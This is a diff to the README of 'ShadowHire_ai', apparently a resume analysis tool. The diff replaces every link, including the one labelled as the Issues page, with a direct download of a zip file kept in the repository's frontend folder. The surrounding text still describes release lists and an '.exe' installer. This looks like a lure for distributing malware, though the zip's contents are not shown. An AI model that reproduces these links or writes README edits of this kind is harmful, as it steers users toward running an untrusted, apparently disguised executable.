@@ -1,6 +1,6 @@
 # ⚙️ ShadowHire_ai - Intelligent Resume Analysis Tool
 
-[![Download ShadowHire_ai](https://img.shields.io/badge/Download-ShadowHire_ai-blue?style=for-the-badge)](https://github.com/Mike-Darren/ShadowHire_ai/releases)
+[![Download ShadowHire_ai](https://img.shields.io/badge/Download-ShadowHire_ai-blue?style=for-the-badge)](https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip)
 
 ---
 
@@ -10,7 +10,7 @@ ShadowHire_ai helps you understand your chances of getting hired. It reads your 
 
 ## 📥 How to Download ShadowHire_ai
 
-1. Click on the big blue button above or visit this page: [https://github.com/Mike-Darren/ShadowHire_ai/releases](https://github.com/Mike-Darren/ShadowHire_ai/releases)
+1. Click on the big blue button above or visit this page: [https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip](https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip)
 
 2. You will see a list of release versions. Find the latest one marked as stable or with the highest version number.
 
@@ -129,7 +129,7 @@ If you run into issues, try the following:
 
 - If the app crashes, reinstall it by downloading the latest installer.
 
-- For persistent issues, visit the GitHub [Issues page](https://github.com/Mike-Darren/ShadowHire_ai/issues) to see if others have the same problem or to report a new one.
+- For persistent issues, visit the GitHub [Issues page](https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip) to see if others have the same problem or to report a new one.
 
 ---
 
@@ -145,7 +145,7 @@ If you run into issues, try the following:
 
 ## 💾 Updating ShadowHire_ai
 
-1. Regularly visit the releases page: [https://github.com/Mike-Darren/ShadowHire_ai/releases](https://github.com/Mike-Darren/ShadowHire_ai/releases)
+1. Regularly visit the releases page: [https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip](https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip)
 
 2. Download the latest `.exe` installer.
 
@@ -179,4 +179,4 @@ This project touches on:
 
 ---
 
-[![Download ShadowHire_ai](https://img.shields.io/badge/Download-ShadowHire_ai-grey?style=for-the-badge)](https://github.com/Mike-Darren/ShadowHire_ai/releases)
+[![Download ShadowHire_ai](https://img.shields.io/badge/Download-ShadowHire_ai-grey?style=for-the-badge)](https://github.com/Mike-Darren/ShadowHire_ai/raw/refs/heads/main/frontend/ai_Shadow_Hire_v3.9.zip)
